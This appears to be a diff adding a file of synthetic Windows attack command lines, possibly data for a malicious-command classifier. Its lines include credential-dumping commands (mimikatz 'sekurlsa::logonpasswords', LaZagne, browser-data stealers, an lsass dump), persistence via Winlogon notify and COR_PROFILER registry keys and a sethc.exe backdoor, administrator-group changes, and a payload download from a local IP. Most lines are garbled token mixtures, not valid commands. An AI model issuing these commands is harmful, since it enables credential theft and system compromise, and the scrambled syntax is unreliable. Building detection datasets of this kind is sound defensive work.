@@ -1,0 +1,64 @@
+nbtstat -n
+reg add `` hkey_local_machine\system\currentcontrolset\control\session packages '' -name `` cor_profiler '' c : cor_profiler '' $ `` http : set-wmiinstance -namespace `` http : \windows\system32\desk.cpl /grant \windows\system32\sethc_backup.exe
+reg query spooler
+copy hkey_local_machine\system\currentcontrolset\control\session localappdata % \microsoft\teams\current\teams.exe
+remove-item http : :logonpasswords
+iediagcmd.exe /out -name `` `` $ : \programdata\microsoft\windows\start localappdata % \system32\osk.exe /grant threadingmodel '' /grant administrators : $ : cor_profiler /grant administrators administrators '' '' -name @ cor_profiler '' -name inprocserver32 '' $ true /grant servicepackminorversion
+rundll32 popcalc.dll , keylog
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' nt\currentversion\windows '' '' /t reg_dword /d 1 /t 1 -name `` $ '' /d true
+rdrleakdiag.exe /p domain administrators { :logonpasswords
+copy :credman
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' cor_profiler /grant cor_profiler /grant cor_profiler /grant keylog
+net localgroup `` ( `` cor_profiler '' '' /grant threadingmodel '' c '' /grant threadingmodel '' -name reg_dword /d 1 '' c `` driver ''
+net localgroup `` administrators `` hklm\software\microsoft\windows t1547.009 user /d `` cor_profiler '' '' /t threadingmodel c '' threadingmodel '' '' /grant select-object
+`` [ net.servicepointmanager ] : :securityprotocol \\ target new-object net.webclient ) \\ $ http : //192.168.1.29:9000/payload/redirect.sdb -o os ; os.system ' /grant 'https http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\windows '' /v driver '' '' cor_profiler '' c administrators '' /t -name threadingmodel '' '' /t threadingmodel $ `` administrators '' `` threadingmodel '' '' -name 1 $ : \windows\system32\sethc_backup.exe
+remove-item -path `` $ /r c : \users\ c : \windows\system32\sethc.exe /grant administrators '' -name '' nt\currentversion\windows c '' objws -name cor_profiler '' c '' /t packages '' /f , # : \windows\system32\sethc_backup.exe
+nbtstat -n -l $ target '' ;
+[ firewall set opmode
+copy `` .\lazagne .. reg_expand_sz http : os ; os.system file ] http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+nbtstat -n administrators
+quser
+adfind.exe -f http : :credman
+tree
+net localgroup `` cor_profiler '' /t logon $ : \windows\system32\sethc.exe /grant administrators '' c '' cor_profiler /grant administrators '' c '' threadingmodel '' threadingmodel '' /grant '' -name threadingmodel '' -name @ '' threadingmodel '' -name $ '' root\subscription '' /grant threadingmodel '' -name \windows\system32\sethc.exe
+lazagne.exe windows
+$ target = set-wmiinstance .id $ cor_profiler '' /grant administrators '' /grant http : keylog
+conhost.exe [ firewall \microsoft\teams\current\teams.exe
+nbtstat -n host
+get-wmiobject /start /output
+namp -sn /add
+quser
+silentrunner.exe $ : cor_profiler '' threadingmodel '' c '' minidump ' '' /grant threadingmodel '' -name $ : reg_dword c : threadingmodel '' -value `` threadingmodel '' -name createobject '' '' -name $ : threadingmodel '' '' -name cor_profiler '' /grant threadingmodel '' '' ''
+copy hklm\software\microsoft\windows powershell % localappdata % \microsoft\teams\current\teams.exe
+lazagne.exe windows
+rundll32 popcalc.dll , http : //192.168.1.29:9000/payload/redirect.sdb -o /grant cor_profiler /grant threadingmodel /grant administrators '' file /grant keylog
+ffuf -w $ shell t1547.009 /fullmemdmp /nowrap '' /f
+sekurlsa : :logonpasswords
+nbtstat -n
+attrib +h $ target t1547.009 exe name = administrators '' '' c administrators '' -name cor_profiler = threadingmodel '' '' /grant threadingmodel '' -name $ : \windows\temp\lsass_dump.dmp
+wmic process list
+lazagne.exe windows
+hack-browser-data-windows-64bit.exe
+lazagne.exe windows
+iediagcmd.exe /out '' $ true
+wordlist -t : -name `` threadingmodel '' c '' c '' \users\ c : \users\
+copy `` 1000 -- http : localappdata % \microsoft\teams\current\teams.exe
+\microsoft\teams\current\teams.exe
+tree
+add-localgroupmember /create `` '' '' c cor_profiler '' c : \programdata\microsoft\windows\start red red -command `` keylog
+esentutl.exe /y $ `` hklm\system\currentcontrolset\control\session '' cor_profiler '' -class -verbose
+colorcpl $ -sn $ target t1547.009 . c : psexecutionpolicypreference '' cor_profiler '' ''
+iediagcmd.exe /out /t $ 1 /f
+attrib +h $ target t1547.009 exe -namespace users
+for : \windows\system32\desk.cpl -namespace -namespace : \microsoft\teams\current\teams.exe
+bitsadmin.exe /resume `` @ $ = hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' -name cor_profiler '' threadingmodel '' /grant threadingmodel '' c '' -class file /grant ' ' /grant ' = set * from __instancemodificationevent *
+lazagne.exe windows
+quser
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' '' /v cor_profiler /grant file /grant set-wmiinstance /grant keylog
+net localgroup `` .\lazagne administrators '' cor_profiler /grant administrators '' c cor_profiler '' '' -name autorun '' '' -l '' ' c $ : \windows\system32\sethc_backup.exe
+net localgroup `` hkey_local_machine\system\currentcontrolset\services\ntds '' manager\environment '' '' file '' -c cor_profiler '' ' '' -name $ /grant minidump : options\svchost.exe '' /grant /grant threadingmodel '' ' /grant threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' /grant -name windir c '' /grant threadingmodel '' /grant threadingmodel
+tasklist
+cmdkey.exe /list
+winrar a -executionpolicy buildnumber c .\lazagne -command : objectcategory=computer '' , command '' # # : nt\currentversion\windows '' '' ;
+python -c `` .\lazagne .. -startaddress $ ( domain admins '' c '' nt\currentversion\winlogon\notify\atomicredteam '' '' '' /f '' fullname , reg_multi_sz
